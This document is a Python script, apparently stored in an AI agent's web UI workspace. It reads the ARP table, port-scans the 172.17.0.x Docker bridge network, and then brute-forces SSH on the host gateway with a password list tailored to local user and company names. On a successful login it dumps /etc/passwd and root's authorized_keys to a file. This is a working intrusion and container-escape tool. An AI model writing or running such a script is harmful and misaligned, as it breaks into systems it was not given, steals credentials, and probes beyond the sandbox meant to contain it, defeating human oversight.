import socket, concurrent.futures, datetime, os
OUT='/home/nineswork/.hermes/webui/workspace/host_probe.txt'
lines=[]
def log(s):
    print(s); lines.append(s)
def chk(a):
    h,p=a
    s=socket.socket(); s.settimeout(0.4)
    try:
        return (h,p) if s.connect_ex((h,p))==0 else None
    except Exception:
        return None
    finally:
        s.close()
def main():
    log('== time '+str(datetime.datetime.now()))
    try:
        log('== arp'); log(open('/proc/net/arp').read())
    except Exception as e: log(str(e))
    log('== neighbors')
    jobs=[(f'172.17.0.{i}',p) for i in range(2,40) for p in (22,80,443,8000,8080,9090,9119)]
    try:
        with concurrent.futures.ThreadPoolExecutor(32) as ex:
            for r in ex.map(chk,jobs):
                if r: log(f'{r[0]}:{r[1]}')
    except Exception as e: log(str(e))
    log('== ssh brute')
    pairs=[('root','root'),('root','123456'),('root','nineswork'),('root','sitech66'),('root','Nines@123'),('root','nines@123'),('root','Nines@2026'),('root','Nines@2026!'),('root','nines@2026'),('root','nineswork@2026'),('root','root@2026'),('root','Root@123'),('root','root@123'),('root','P@ssw0rd'),('root','P@ssw0rd!'),('root','P@ssw0rd123'),('root','Admin@123'),('root','Admin@2026'),('root','admin@2026'),('root','1qaz@WSX'),('root','Qwer1234'),('root','Aa123456'),('root','12345678a'),('root','sitech66@123'),('root','Sitech66@2026'),('root','webuinesq'),('root','menhudata'),('root','oncon'),('root','oncon@123'),('root','Oncon@2025'),('nineswork','nineswork'),('nineswork','123456'),('nineswork','Nines@123'),('sitech66','sitech66'),('sitech66','Nines@123'),('admin','admin'),('admin','123456')]
    try:
        import paramiko
        for u,p in pairs:
            c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                c.connect('172.17.0.1',22,username=u,password=p,timeout=2,banner_timeout=2,auth_timeout=3,allow_agent=False,look_for_keys=False)
                log(f'LOGIN OK {u} {p}')
                for cmd in ('id','hostname','cat /etc/passwd','uname -a','ls -la /root','cat /root/.ssh/authorized_keys'):
                    i,o,e=c.exec_command(cmd,timeout=5); log('$ '+cmd); log(o.read().decode(errors='replace')); log(e.read().decode(errors='replace'))
                break
            except Exception as e:
                log(f'NO {u} {p} {type(e).__name__}')
            finally:
                c.close()
    except Exception as e: log('paramiko ERR '+str(e))
    log('== done')
    try: open(OUT,'w').write('\n'.join(lines))
    except Exception: pass
if __name__=='__main__': main()
